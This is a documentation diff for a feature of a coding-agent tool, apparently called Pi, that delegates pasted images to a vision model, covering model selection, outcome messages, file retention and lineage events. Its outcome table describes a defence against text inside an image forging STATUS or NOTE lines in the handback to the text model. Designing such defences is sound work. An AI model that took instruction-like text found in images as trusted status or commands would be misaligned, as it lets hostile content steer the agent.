+- An unknown key, a `vision_delegate` value that is not a mapping, an `enabled` that is not `true` or
+  `false`, or an `alias_preference` that is not such a list turns the feature off and shows a note saying why.
+
+The settings are read once per Pi process, on the first image that needs a vision model; edit the file and
+restart Pi to change them.
+
+### Choosing the vision model
+
+Pi tries the `alias_preference` ids first, then any other model in `models.json` whose `input` includes
+`"image"`, and uses the first one whose gateway health check is healthy. The check is the gateway recovery
+probe, and it treats concrete ids and aliases differently:
+
+- A concrete model id must be listed by the gateway's `/models` and, on an InferWeave gateway, also needs a
+  fresh entry in the admission report. Without one the probe rejects it (`capacity unknown: no fresh known
+  model-level admission report`).
+- An alias (such as `qwen3.8-vision`) is accepted without an admission entry when its members are live
+  (`alias qwen3.8-vision has 1 live member(s): ...`).
+
+Both answers were seen live against the lab gateway; see "The production probe" in
+`docs/evidence/vision-delegation-acceptance.md`. The preferred `qwen3.8-vision` alias still has to be an
+image-capable entry in `models.json` for Pi to consider it; `/model-refresh` adds it once the gateway
+advertises it. With no image-capable model, or none healthy, you get the "no vision model" outcome below; Pi
+never falls back silently.
+
+### What you see for each outcome
+
+Every outcome reaches the text model as explicit text; an image is never dropped silently.
+
+| Outcome | What the text model is told |
+| --- | --- |
+| ok | `You cannot see them. Vision model "<id>" analysed them…`, `STATUS: ok.`, the image paths, then `Description`, `Text in image`, `Findings for the task` and `Uncertainties`, and `STATUS: ok.` again as the last line. Every line the vision model wrote starts with `\| ` (a lone `\|` for an empty line), and the block says that only those lines are the model's words, so text in an image cannot forge a `STATUS:` or `NOTE:` line. |
+| partial | the same block with `STATUS: partial. The analysis is incomplete; treat gaps as unknown.` |
+| failed (by the vision model) | the same block with `STATUS: failed. The vision model could not analyse the image(s); do not rely on the content below.` |
+| failed (delegation) | `You cannot see the image(s), and no vision analysis is available.` and `Vision delegation did not complete: <why>` (the pane could not start, exited before writing a result, stopped without writing a result, or the result was rejected), plus the saved image paths. |
+| timeout | the same, with `the analysis timed out after <n> seconds (vision model <id>)`. |
+| no vision model | the same, with `no vision model was available.` and every model and why it was not used. |
+| herdr missing | the same, with `herdr is unavailable (this session is not running in a herdr pane)` (or `this herdr client cannot split panes`). |
+| build failure | a warning `The pasted image was not analyzed: vision delegation could not start (<why>)…`; the message goes on unchanged, so the text model sees only Pi's placeholder. Unreadable settings give the same kind of warning. |
+
+The vision pane stays open after an accepted result (`ok`, `partial`, or `failed` reported by the vision model)
+so later images can reuse it. After a delegation failure or a timeout Pi closes it, and a reused session that failed is forgotten, so the next image starts a new one. If
+the vision pane is gone (for example you closed it), the next image starts a new vision session and the
+handback says that earlier images are no longer in the vision session's context. A vision agent that exits
+before writing a result is noticed within a few seconds (`the vision pane exited before writing a result`),
+not at the end of `wait_seconds`. One that stays open but sits idle without writing a result (for example on
+a model id the gateway does not serve, where the vision Pi shows an error and waits) is reported as `the
+vision agent stopped without writing a result` once herdr has reported it idle or done on 4 pane checks in a
+row (one every 2.5 seconds) and at least 30 seconds have passed since delivery. An agent that keeps working
+is still bounded by `wait_seconds` only.
+
+### Limitation: the wait cannot be cancelled
+
+Ctrl-C and Escape do not cancel a delegation. Pi gives an input handler no abort signal while the agent is
+idle, Escape only aborts a streaming turn, and a second Ctrl-C quits Pi. The wait is bounded by
+`wait_seconds` only, which is why the footer shows the bound. A message you send meanwhile is queued and runs
+after the delegation ends. Lower `wait_seconds` if five minutes is too long.
+
+### Where the files live
+
+Under `~/.pi/agent/vision-delegation/`: `registry.json` maps each Pi session to its vision pane, and
+`requests/<requestId>/` holds the saved images, `handoff.md`, `request.json`, `instructions.md`,
+`role-prompt.md`, `state.json` (status, pane id, whether the result was injected), `results/` and the vision
+session's `session/` directory. A result that lands after a timeout is left there and never injected.
+
+### Retention and lifetime
+
+- **Request directories are kept until you delete them.** Each `requests/<requestId>/` keeps its
+  `handoff.md`, a copy of the recent session context, which may contain secrets you pasted or that the
+  session read, next to the saved images and the vision session's transcript. Pi never removes them; delete
+  `~/.pi/agent/vision-delegation/requests/` (or single request directories) by hand when you no longer
+  need them.
+- **Vision panes outlive the text session.** A vision pane and its Pi process are not closed when the text
+  session ends, when you quit Pi, or when you switch sessions. A reused session's pane stays open until a
+  delegation in it fails (Pi then closes it) or you close it yourself.
+- **Orphan panes.** If a reused vision Pi exits between requests, its shell pane is left behind. Pi only
+  ever closes a pane whose identity it created or confirmed in the same call (the agent name answering from
+  the registered pane id), so it never closes that shell pane, or any pane where another agent now runs;
+  close it by hand.
+
+### Lineage events
+
+Each delegation emits two handoffs through the existing lineage emitter: out, id `vision-<requestId>-out`,
+cause `vision_delegate`; and back, id `vision-<requestId>-back`, cause `vision_return`. The handoff kind
+carries the outcome (`vision`, `vision_partial`, `vision_failed`, `vision_timeout`), and both carry the text
+and vision model. No image count is carried. The events reach herdr only when the `herdr:` block of the global
+`engineering.yaml` sets `lineage: true` (see "Herdr connection" above); without it nothing is sent.
